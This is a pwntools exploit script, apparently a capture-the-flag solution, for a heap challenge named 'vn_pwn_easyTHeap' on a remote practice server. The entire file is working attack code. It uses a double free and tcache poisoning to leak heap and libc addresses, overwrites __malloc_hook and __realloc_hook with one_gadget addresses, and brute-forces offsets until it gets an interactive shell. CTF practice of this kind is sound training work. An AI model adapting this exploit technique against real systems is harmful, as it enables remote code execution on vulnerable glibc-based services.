from pwn import *

context.arch = 'amd64'
elf = ELF('./vn_pwn_easyTHeap')
libc = ELF('../../libc/1864')

r = remote('node3.buuoj.cn', 26293)


def malloc(size):
    r.recvuntil('choice: ')
    r.sendline('1')
    r.recvuntil('size?')
    r.send(str(size))


def edit(index, content):
    r.recvuntil('choice: ')
    r.sendline('2')
    r.recvuntil('idx?')
    r.send(str(index))
    r.recvuntil('content:')
    r.send(content)


def show(index):
    r.recvuntil('choice: ')
    r.sendline('3')
    r.recvuntil('idx?')
    r.send(str(index))


def free(index):
    r.recvuntil('choice: ')
    r.send('4')
    r.recvuntil('idx?')
    r.send(str(index))


def pwn(ogg, off):
    malloc(0x90)  # 0
    free(0)
    free(0)
    show(0)  # leak tcache_addr
    tcache_addr = u64(r.recv(6).ljust(8, b'\x00')) - 0x250
    malloc(0x90)  # 0 1
    edit(1, p64(tcache_addr))
    malloc(0x90)  # 0 2
    malloc(0x90)  # 3 tcache
    # override count of chunk sized 0x250 and set address back to tcache
    edit(3, flat([0, 0, 0, 0]) + b'\x00\x00\x00\x0F' + p32(0) + flat([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, tcache_addr]))
    free(3)  # 3 -> unsorted bin
    show(3)  # leak libc_base
    libc_base = u64(r.recv(6).ljust(8, b'\x00')) - 0x3EBCA0
    malloc_hook_addr = libc_base + libc.sym['__malloc_hook']
    one_gadget_addr = libc_base + ogg
    realloc_addr = libc_base + libc.sym['__libc_realloc'] + off
    malloc(0x90)  # 4 tcache
    edit(4, p64(0) * 16 + p64(malloc_hook_addr - 0x8))
    malloc(0x90)  # 5 realloc_hook
    edit(5, flat([one_gadget_addr, realloc_addr]))
    malloc(0x10)
    r.sendline('id')
    message = r.recv(3)
    if message == b'uid':
        r.recvline()
        r.interactive()
        quit()


one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
realloc_offset = [0, 2, 4, 6, 8, 0xB, 0xC, 0xD]
for ogg in one_gadget:
    for off in realloc_offset:
        try:
            pwn(ogg, off)
            r.close()
            r = remote('node3.buuoj.cn', 26293)
        except EOFError:
            r.close()
            r = remote('node3.buuoj.cn', 26293)
